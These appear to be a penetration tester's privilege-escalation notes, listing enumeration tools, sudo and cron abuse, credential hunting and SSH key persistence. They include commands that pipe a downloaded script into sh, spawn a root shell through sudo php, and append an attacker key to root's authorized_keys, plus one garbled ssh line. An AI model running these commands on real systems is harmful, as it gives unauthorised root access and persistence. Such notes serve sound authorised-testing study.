Checklists to check potential vulnerabilities to get higher privileges :
- https://book.hacktricks.xyz/welcome/readme
- https://github.com/swisskyrepo/PayloadsAllTheThings

Enumeration :
- https://github.com/rebootuser/LinEnum
- https://github.com/sleventyeleven/linuxprivchecker
- https://github.com/GhostPack/Seatbelt
- https://github.com/411Hall/JAWS

Enumeration from PEASS-ng :
- https://github.com/carlospolop/PEASS-ng
./linpeas.sh

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

1. Kernel Exploits

If the server version is old, check the exploits linked Kernel vulnerabilities

Keep in mind : kernel exploits can cause system instability, and we should take great care before running them on production systems. (test on dev lab before running in production and with explicit approval and coordination with our client)

2. Vulnerable Software

Look for is installed software :

- On linux : dpkg -l
- On Windows : ls c:\Progam Files

3. User Privileges

- Check Sudo privileges : sudo -l
    (user : user) NOPASSWD: /bin/echo -> no password required to run /bin/echo 
    sudo -u user /bin/echo Hello World!
    CMD="/bin/sh"
    sudo php -r "system('$CMD');"
- SUID
    https://gtfobins.github.io/
- Windows Token Privileges
    https://lolbas-project.github.io/#

4. Scheduled Tasks

4.1. Add new scheduled tasks/cron jobs
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root
4.2. Trick them to execute a malicious software

5. Exposed Credentials

- Configuration files
- Log files
- user history files (bash_history in Linux and PSReadLine in Windows)
- Password reuse : same password of our user (su -)

The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us, as below:

6. SSH Keys

/home/user/.ssh/id_rsa
/root/.ssh/id_rsa

chmod 600 id_rsa
ssh user@10.10.10.10 -i id_rsa

place our public ssh key in /home/user/.ssh/authorized_keys
ssh-keygen -f key

2 keys are generated :
key
key.pub

Add our public key on the remote host :
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys

    ssh -p "password1‚Äù  ssh user1@94.237.56.76

ssh -p 41385 root@83.136.252.24 -i id_rsa
chmod 600 id_rsa
